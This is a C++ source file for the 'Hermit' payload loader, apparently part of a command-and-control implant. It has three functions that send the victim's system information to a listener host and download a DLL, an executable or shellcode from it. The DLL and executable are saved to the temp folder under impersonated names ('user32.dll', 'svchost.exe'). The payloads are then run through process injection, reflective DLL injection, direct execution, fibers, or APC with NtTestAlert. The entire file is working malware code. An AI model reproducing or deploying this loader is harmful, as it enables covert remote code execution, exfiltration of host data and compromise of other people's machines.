#include "hermit.hpp"

namespace Hermit
{
    VOID DLLLoader()
    {
        // Load modules for dynamac API resolution.
        HMODULE hWinHTTPDLL = LoadLibrary(L"winhttp.dll");
        if (!hWinHTTPDLL)
            return;

        Procs::PPROCS pProcs = Procs::FindProcs(hWinHTTPDLL);

        HINTERNET hSession = NULL;
        HINTERNET hConnect = NULL;
        HINTERNET hRequest = NULL;
        BOOL bResults = FALSE;

        // Get system information as json.
        std::wstring wInfoJSON = Handler::GetInitialInfoJSON();
        std::string sInfoJSON = Utils::Convert::UTF8Encode(wInfoJSON);

        System::Http::WinHttpHandlers handlers = System::Http::InitRequest(
            pProcs,
            LISTENER_HOST_W,
            LISTENER_PORT
        );
        if (!handlers.hSession || !handlers.hConnect) {
            Free(hWinHTTPDLL, pProcs, hSession, hConnect, hRequest);
            return;
        }

        hSession = handlers.hSession;
        hConnect = handlers.hConnect;

        // Download a DLL file
        System::Http::WinHttpResponse resp = System::Http::SendRequest(
            pProcs,
            hConnect,
            LISTENER_HOST_W,
            LISTENER_PORT,
            REQUEST_PATH_DOWNLOAD_W,
            L"POST",
            L"Content-Type: application/json\r\n",
            (LPVOID)sInfoJSON.c_str(),
            (DWORD)strlen(sInfoJSON.c_str())
        );
        if (!resp.bResult || resp.dwStatusCode != 200)
        {
            Free(hWinHTTPDLL, pProcs, hSession, hConnect, hRequest);
            return;
        }

        hRequest = resp.hRequest;

        // Set the temp file path
        std::wstring dllFileName = L"user32.dll"; // Impersonate the file name.
        std::wstring dllPath = System::Env::GetStrings(L"%TEMP%") + L"\\" + dllFileName;
        size_t dwDllPathSize = (dllPath.size() + 1) * sizeof(wchar_t);

        // Download a DLL file (create a file)
        bResults = System::Http::WriteResponseData(pProcs, hRequest, dllPath);
        if (!bResults)
        {
            Free(hWinHTTPDLL, pProcs, hSession, hConnect, hRequest);
            return;
        }
        System::Http::WinHttpCloseHandles(pProcs, hSession, hConnect, hRequest);

        // Target PID
        DWORD dwPID;

        // Inject DLL
        if (strcmp(PAYLOAD_TECHNIQUE, "dll-injection") == 0)
        {
            dwPID = System::Process::GetProcessIdByName(TEXT(PAYLOAD_PROCESS_TO_INJECT));
            Technique::Injection::DLLInjection(dwPID, (LPVOID)dllPath.c_str(), dwDllPathSize);
        }
        else if (strcmp(PAYLOAD_TECHNIQUE, "reflective-dll-injection") == 0)
        {
            Technique::Injection::ReflectiveDLLInjection(dllPath.c_str(), dwDllPathSize);
        }

        Free(hWinHTTPDLL, pProcs, hSession, hConnect, hRequest);
        return;
    }

    VOID ExecLoader()
    {
        // Load modules for dynamac API resolution.
        HMODULE hWinHTTPDLL = LoadLibrary(L"winhttp.dll");
        if (!hWinHTTPDLL)
            return;

        Procs::PPROCS pProcs = Procs::FindProcs(hWinHTTPDLL);

        HINTERNET hSession = NULL;
        HINTERNET hConnect = NULL;
        HINTERNET hRequest = NULL;
        BOOL bResults = FALSE;

        // Get system information as json.
        std::wstring wInfoJSON = Handler::GetInitialInfoJSON();
        std::string sInfoJSON = Utils::Convert::UTF8Encode(wInfoJSON);

        System::Http::WinHttpHandlers handlers = System::Http::InitRequest(
            pProcs,
            LISTENER_HOST_W,
            LISTENER_PORT
        );
        if (!handlers.hSession || !handlers.hConnect) {
            Free(hWinHTTPDLL, pProcs, hSession, hConnect, hRequest);
            return;
        }

        hSession = handlers.hSession;
        hConnect = handlers.hConnect;

        // Download an executable
        System::Http::WinHttpResponse resp = System::Http::SendRequest(
            pProcs,
            hConnect,
            LISTENER_HOST_W,
            LISTENER_PORT,
            REQUEST_PATH_DOWNLOAD_W,
            L"POST",
            L"Content-Type: application/json\r\n",
            (LPVOID)sInfoJSON.c_str(),
            (DWORD)strlen(sInfoJSON.c_str())
        );
        if (!resp.bResult || resp.dwStatusCode != 200)
        {
            Free(hWinHTTPDLL, pProcs, hSession, hConnect, hRequest);
            return;
        }

        hRequest = resp.hRequest;

        // Set the temp file path
        std::wstring execFileName = L"svchost.exe"; // Impersonate the file name.
        std::wstring execPath = System::Env::GetStrings(L"%TEMP%") + L"\\" + execFileName;
        
        // Download an executable
        if (!System::Http::WriteResponseData(pProcs, hRequest, execPath))
        {
            Free(hWinHTTPDLL, pProcs, hSession, hConnect, hRequest);
            return;
        }

        // Execute
        if (strcmp(PAYLOAD_TECHNIQUE, "direct-execution") == 0)
        {
            System::Process::ExecuteFile(execPath);
        }

        Free(hWinHTTPDLL, pProcs, hSession, hConnect, hRequest);
        return;
    }

    VOID ShellcodeLoader()
    {
        // Load modules for dynamac API resolution.
        HMODULE hWinHTTPDLL = LoadLibrary(L"winhttp.dll");
        if (!hWinHTTPDLL)
            return;

        Procs::PPROCS pProcs = Procs::FindProcs(hWinHTTPDLL);

        HINTERNET hSession = NULL;
        HINTERNET hConnect = NULL;
        HINTERNET hRequest = NULL;
        BOOL bResults = FALSE;

        // Get system information as json.
        std::wstring wInfoJSON = Handler::GetInitialInfoJSON();
        std::string sInfoJSON = Utils::Convert::UTF8Encode(wInfoJSON);

        System::Http::WinHttpHandlers handlers = System::Http::InitRequest(
            pProcs,
            LISTENER_HOST_W,
            LISTENER_PORT
        );
        if (!handlers.hSession || !handlers.hConnect) {
            Free(hWinHTTPDLL, pProcs, hSession, hConnect, hRequest);
            return;
        }

        hSession = handlers.hSession;
        hConnect = handlers.hConnect;

        // Download shellcode
        System::Http::WinHttpResponse resp = System::Http::SendRequest(
            pProcs,
            hConnect,
            LISTENER_HOST_W,
            LISTENER_PORT,
            REQUEST_PATH_DOWNLOAD_W,
            L"POST",
            L"Content-Type: application/json\r\n",
            (LPVOID)sInfoJSON.c_str(),
            (DWORD)strlen(sInfoJSON.c_str())
        );
        if (!resp.bResult || resp.dwStatusCode != 200)
        {
            Free(hWinHTTPDLL, pProcs, hSession, hConnect, hRequest);
            return;
        }

        hRequest = resp.hRequest;

        std::vector<BYTE> respBytes = System::Http::ReadResponseBytes(pProcs, hRequest);
        if (respBytes.size() == 0)
        {
            Free(hWinHTTPDLL, pProcs, hSession, hConnect, hRequest);
            return;
        }

        // Target PID
        DWORD dwPID;

        // Inject shellcode
        if (strcmp(PAYLOAD_TECHNIQUE, "shellcode-injection") == 0)
        {
            dwPID = System::Process::GetProcessIdByName(TEXT(PAYLOAD_PROCESS_TO_INJECT));
            Technique::Injection::ShellcodeInjection(dwPID, respBytes);
        }
        else if (strcmp(PAYLOAD_TECHNIQUE, "shellcode-execution-via-fibers") == 0)
        {
            Technique::Injection::ShellcodeExecutionViaFibers(respBytes);
        }
        else if (strcmp(PAYLOAD_TECHNIQUE, "shellcode-execution-via-apc-and-nttestalert") == 0)
        {
            Technique::Injection::ShellcodeExecutionViaAPCAndNtTestAlert(respBytes);
        }

        Free(hWinHTTPDLL, pProcs, hSession, hConnect, hRequest);
        return;
    }

    VOID Free(
        HMODULE hWinHTTPDLL,
        Procs::PPROCS pProcs,
        HINTERNET hSession,
        HINTERNET hConnect,
        HINTERNET hRequest
    ) {
        System::Http::WinHttpCloseHandles(pProcs, hSession, hConnect, hRequest);
        delete pProcs;
        FreeLibrary(hWinHTTPDLL);
    }
}
